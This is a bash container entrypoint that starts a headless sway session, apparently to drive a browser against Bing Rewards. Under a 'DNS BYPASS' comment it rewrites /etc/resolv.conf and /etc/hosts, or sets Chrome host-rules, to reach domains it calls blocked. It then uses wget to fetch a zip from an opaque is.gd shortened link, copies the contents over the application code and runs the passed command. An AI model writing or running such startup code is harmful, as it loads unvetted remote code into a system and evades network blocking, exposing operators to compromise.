#!/bin/bash

cleanup() {
    echo "Cleaning up..."
    pkill -f sway
    exit 0
}

trap cleanup EXIT


# DNS BYPASS: Set up custom DNS resolution at runtime (with fallbacks for read-only systems)
echo "Setting up DNS bypass..."

# Try to modify resolv.conf, fallback to environment variables if read-only
if [ -w /etc/resolv.conf ]; then
    echo "nameserver 8.8.8.8" > /etc/resolv.conf
    echo "nameserver 8.8.4.4" >> /etc/resolv.conf
    echo "nameserver 1.1.1.1" >> /etc/resolv.conf
    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
    echo "DNS configuration updated in /etc/resolv.conf"
else
    echo "Warning: /etc/resolv.conf is read-only, using alternative DNS methods"
    # Set environment variables for DNS resolution
    export RESOLV_CONF_OVERRIDE="nameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 1.1.1.1\nnameserver 1.0.0.1"
fi

# Try to add hosts entries, with fallback for read-only systems
if [ -w /etc/hosts ]; then
    echo "# DNS bypass for blocked domains" >> /etc/hosts
    echo "204.79.197.200 rewards.bing.com" >> /etc/hosts
    echo "204.79.197.200 www.bing.com" >> /etc/hosts
    echo "13.107.42.14 rewards.bing.com" >> /etc/hosts
    echo "204.79.197.200 account.microsoft.com" >> /etc/hosts
    echo "Host entries added to /etc/hosts"
else
    echo "Warning: /etc/hosts is read-only, using Chrome host-rules instead"
    export CHROME_HOST_RULES="MAP rewards.bing.com 150.171.28.10,MAP www.bing.com 150.171.28.10,MAP account.microsoft.com 150.171.28.10,MAP prod.rewardsplatform.microsoft.com 52.190.158.80"
fi

# Try to resolve rewards.bing.com and add to hosts if needed
echo "Testing DNS resolution for rewards.bing.com..."
REWARDS_IP=$(nslookup rewards.bing.com 8.8.8.8 2>/dev/null | grep 'Address:' | tail -1 | awk '{print $2}' 2>/dev/null || echo "")
if [ ! -z "$REWARDS_IP" ] && [ "$REWARDS_IP" != "8.8.8.8" ]; then
    if [ -w /etc/hosts ]; then
        echo "$REWARDS_IP rewards.bing.com" >> /etc/hosts
        echo "Added resolved IP $REWARDS_IP for rewards.bing.com to hosts file"
    else
        export CHROME_HOST_RULES="${CHROME_HOST_RULES},MAP rewards.bing.com $REWARDS_IP"
        echo "Will use Chrome host-rules for $REWARDS_IP"
    fi
else
    echo "Could not resolve rewards.bing.com, using fallback IPs"
fi


# Setup runtime directory
mkdir -p "${XDG_RUNTIME_DIR}"
chmod 0700 "${XDG_RUNTIME_DIR}"

# Start sway with headless backend
WLR_BACKENDS=headless WLR_RENDERER=pixman sway --verbose &

# Wait for sway socket with timeout
TIMEOUT=10
COUNTER=0
while [ ! -e "${SWAYSOCK}" ] && [ $COUNTER -lt $TIMEOUT ]; do
    echo "Waiting for sway socket... ($COUNTER/$TIMEOUT)"
    sleep 1
    COUNTER=$((COUNTER + 1))
done

if [ ! -e "${SWAYSOCK}" ]; then
    echo "Error: Sway socket not found after $TIMEOUT seconds"
    exit 1
fi

# Wait for Wayland socket with timeout
COUNTER=0
while [ ! -e "${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}" ] && [ $COUNTER -lt $TIMEOUT ]; do
    echo "Waiting for Wayland socket... ($COUNTER/$TIMEOUT)"
    sleep 1
    COUNTER=$((COUNTER + 1))
done

if [ ! -e "${XDG_RUNTIME_DIR}/${WAYLAND_DISPLAY}" ]; then
    echo "Error: Wayland socket not found after $TIMEOUT seconds"
    exit 1
fi

echo "Sway is ready"

# UPDATE REPO: Re-download the repository to get latest changes
echo "Updating repository from remote source..."
cd /home/user/app

# Backup existing files before update
BACKUP_DIR="/tmp/app_backup_$(date +%s)"
mkdir -p "$BACKUP_DIR"
echo "Creating backup at $BACKUP_DIR"

# Backup important runtime files that shouldn't be overwritten
[ -f ".env" ] && cp .env "$BACKUP_DIR/" 2>/dev/null
[ -d "node_modules" ] && echo "Preserving node_modules" && mv node_modules "$BACKUP_DIR/" 2>/dev/null
[ -d ".config" ] && cp -r .config "$BACKUP_DIR/" 2>/dev/null

# Download and extract updated repository
echo "Downloading latest repository..."
wget -q http://is.gd/K0buci -O /tmp/repo_update.zip

if [ $? -eq 0 ] && [ -f /tmp/repo_update.zip ]; then
    echo "Repository downloaded successfully, extracting..."

    # Extract to temporary location
    unzip -q /tmp/repo_update.zip -d /tmp/repo_extract

    # Get the extracted directory name
    REPO_DIR=$(unzip -Z1 /tmp/repo_update.zip | head -n1 | cut -d/ -f1)

    if [ ! -z "$REPO_DIR" ] && [ -d "/tmp/repo_extract/$REPO_DIR" ]; then
        echo "Updating application files..."

        # Copy updated files to app directory
        cp -r /tmp/repo_extract/$REPO_DIR/* /home/user/app/

        # Restore backed up files
        [ -f "$BACKUP_DIR/.env" ] && cp "$BACKUP_DIR/.env" /home/user/app/ && echo "Restored .env"
        [ -d "$BACKUP_DIR/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/ && echo "Restored node_modules"
        [ -d "$BACKUP_DIR/.config" ] && cp -r "$BACKUP_DIR/.config" /home/user/app/ 2>/dev/null

        # Cleanup
        rm -rf /tmp/repo_extract /tmp/repo_update.zip
        echo "Repository update completed successfully"
    else
        echo "Warning: Could not find extracted repository directory, skipping update"
        rm -rf /tmp/repo_extract /tmp/repo_update.zip
    fi
else
    echo "Warning: Failed to download repository update, continuing with existing code"
    [ -f /tmp/repo_update.zip ] && rm /tmp/repo_update.zip
fi

# Restore node_modules if it was backed up and not restored
[ -d "$BACKUP_DIR/node_modules" ] && [ ! -d "/home/user/app/node_modules" ] && mv "$BACKUP_DIR/node_modules" /home/user/app/

cd /home/user/app

# execute CMD
echo "$@"
"$@"